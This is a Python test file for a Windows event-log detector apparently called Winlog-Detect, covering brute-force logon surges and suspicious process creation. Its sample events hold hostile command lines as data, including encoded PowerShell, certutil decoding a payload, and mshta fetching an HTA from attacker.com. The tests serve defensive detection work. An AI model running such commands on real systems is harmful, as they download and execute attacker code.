"""
Comprehensive test scenarios for Winlog-Detect
Tests the detection logic with controlled, realistic data
"""
import pandas as pd
from pathlib import Path
from detectors import failed_logon_surge, suspicious_process_creation
import sys

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))


def create_test_df(events_list):
    """
    Helper to create a test dataframe from event dicts
    events_list: list of dicts with keys: TimeCreated, EventID, Message, ProviderName, Level
    """
    df = pd.DataFrame(events_list)
    df["TimeCreated"] = pd.to_datetime(df["TimeCreated"], utc=True)
    df["EventID"] = pd.to_numeric(df["EventID"])
    return df


def test_scenario_1_brute_force_attack():
    """
    SCENARIO 1: Classic brute force - 5 failed logins in rapid succession
    Expected: Alert triggered (threshold=3, default window=2min)
    """
    events = [
        {"TimeCreated": "2025-08-10T12:00:00Z", "EventID": 4625, "Message": "Failed login for user alice", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:00:15Z", "EventID": 4625, "Message": "Failed login for user alice", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:00:30Z", "EventID": 4625, "Message": "Failed login for user alice", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:00:45Z", "EventID": 4625, "Message": "Failed login for user alice", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:01:00Z", "EventID": 4625, "Message": "Failed login for user alice", "ProviderName": "Security", "Level": "Information"},
    ]
    
    df = create_test_df(events)
    alerts = failed_logon_surge(df, window="2min", threshold=3)
    
    print(f"✓ Scenario 1 - Brute Force Attack: {len(alerts)} alerts")
    assert len(alerts) >= 1, "Should detect brute force attempt"
    assert alerts[0]["rule"] == "failed_logon_surge"
    assert alerts[0]["count"] >= 3


def test_scenario_2_encoded_powershell():
    """
    SCENARIO 2: Suspicious process creation with encoded PowerShell
    Expected: Alert triggered
    """
    events = [
        {"TimeCreated": "2025-08-10T12:00:00Z", "EventID": 4688, "Message": "Process created. CommandLine: powershell.exe -enc aQBmACgA", "ProviderName": "Security", "Level": "Information"},
    ]
    
    df = create_test_df(events)
    alerts = suspicious_process_creation(df)
    
    print(f"✓ Scenario 2 - Encoded PowerShell: {len(alerts)} alerts")
    assert len(alerts) >= 1, "Should detect encoded PowerShell"
    assert alerts[0]["rule"] == "suspicious_process_creation"
    assert alerts[0]["indicator"] == "-enc"


def test_scenario_3_normal_activity():
    """
    SCENARIO 3: Normal activity - no suspicious patterns
    Expected: No alerts
    """
    events = [
        {"TimeCreated": "2025-08-10T12:00:00Z", "EventID": 4625, "Message": "Failed login for user bob", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:05:00Z", "EventID": 4625, "Message": "Failed login for user charlie", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:10:00Z", "EventID": 4688, "Message": "Process created. CommandLine: notepad.exe", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:15:00Z", "EventID": 4688, "Message": "Process created. CommandLine: cmd.exe /c ipconfig", "ProviderName": "Security", "Level": "Information"},
    ]
    
    df = create_test_df(events)
    alerts_logon = failed_logon_surge(df, window="2min", threshold=3)
    alerts_proc = suspicious_process_creation(df)
    
    print(f"✓ Scenario 3 - Normal Activity: {len(alerts_logon)} logon alerts, {len(alerts_proc)} process alerts")
    assert len(alerts_logon) == 0, "Should not alert on scattered failed logins"
    assert len(alerts_proc) == 0, "Should not alert on normal processes"


def test_scenario_4_certutil_execution():
    """
    SCENARIO 4: Suspicious process - certutil execution
    Expected: Alert triggered
    """
    events = [
        {"TimeCreated": "2025-08-10T12:00:00Z", "EventID": 4688, "Message": "Process created. CommandLine: certutil.exe -decode payload.txt output.exe", "ProviderName": "Security", "Level": "Information"},
    ]
    
    df = create_test_df(events)
    alerts = suspicious_process_creation(df)
    
    print(f"✓ Scenario 4 - Certutil Execution: {len(alerts)} alerts")
    assert len(alerts) >= 1, "Should detect certutil"
    assert alerts[0]["indicator"] == "certutil"


def test_scenario_5_slow_brute_force():
    """
    SCENARIO 5: Slow brute force - below detection threshold
    2 failed logins spread over 5 minutes (below 3 in 2min threshold)
    Expected: No alerts
    """
    events = [
        {"TimeCreated": "2025-08-10T12:00:00Z", "EventID": 4625, "Message": "Failed login", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:02:30Z", "EventID": 4625, "Message": "Failed login", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:05:00Z", "EventID": 4625, "Message": "Failed login", "ProviderName": "Security", "Level": "Information"},
    ]
    
    df = create_test_df(events)
    alerts = failed_logon_surge(df, window="2min", threshold=3)
    
    print(f"✓ Scenario 5 - Slow Brute Force: {len(alerts)} alerts")
    # This might trigger or not depending on window alignment - verify behavior


def test_scenario_6_multiple_suspicious_processes():
    """
    SCENARIO 6: Multiple suspicious processes in same timeframe
    Expected: Multiple alerts
    """
    events = [
        {"TimeCreated": "2025-08-10T12:00:00Z", "EventID": 4688, "Message": "CommandLine: powershell.exe -encodedcommand ABC123", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:00:05Z", "EventID": 4688, "Message": "CommandLine: rundll32.exe payload.dll", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:00:10Z", "EventID": 4688, "Message": "CommandLine: mshta.exe http://attacker.com/malware.hta", "ProviderName": "Security", "Level": "Information"},
    ]
    
    df = create_test_df(events)
    alerts = suspicious_process_creation(df)
    
    print(f"✓ Scenario 6 - Multiple Suspicious Processes: {len(alerts)} alerts")
    assert len(alerts) >= 3, "Should detect all three suspicious processes"


def test_scenario_7_combined_attack():
    """
    SCENARIO 7: Realistic attack chain - brute force + malicious execution
    Expected: Both types of alerts
    """
    events = [
        # Brute force phase
        {"TimeCreated": "2025-08-10T12:00:00Z", "EventID": 4625, "Message": "Failed login user admin", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:00:10Z", "EventID": 4625, "Message": "Failed login user admin", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:00:20Z", "EventID": 4625, "Message": "Failed login user admin", "ProviderName": "Security", "Level": "Information"},
        {"TimeCreated": "2025-08-10T12:00:30Z", "EventID": 4625, "Message": "Failed login user admin", "ProviderName": "Security", "Level": "Information"},
        # After successful breach - malicious execution
        {"TimeCreated": "2025-08-10T12:01:00Z", "EventID": 4688, "Message": "CommandLine: powershell.exe -enc dABhAHMAawBsAGkAcwB0AA==", "ProviderName": "Security", "Level": "Information"},
    ]
    
    df = create_test_df(events)
    alerts_logon = failed_logon_surge(df, window="2min", threshold=3)
    alerts_proc = suspicious_process_creation(df)
    
    total_alerts = len(alerts_logon) + len(alerts_proc)
    print(f"✓ Scenario 7 - Combined Attack: {total_alerts} total alerts ({len(alerts_logon)} logon, {len(alerts_proc)} process)")
    assert total_alerts >= 2, "Should detect both brute force and malicious execution"


if __name__ == "__main__":
    print("\n" + "="*60)
    print("WINLOG-DETECT SCENARIO TESTS")
    print("="*60 + "\n")
    
    try:
        test_scenario_1_brute_force_attack()
        test_scenario_2_encoded_powershell()
        test_scenario_3_normal_activity()
        test_scenario_4_certutil_execution()
        test_scenario_5_slow_brute_force()
        test_scenario_6_multiple_suspicious_processes()
        test_scenario_7_combined_attack()
        
        print("\n" + "="*60)
        print("✓ ALL TESTS PASSED!")
        print("="*60 + "\n")
    except AssertionError as e:
        print(f"\n✗ TEST FAILED: {e}\n")
        raise
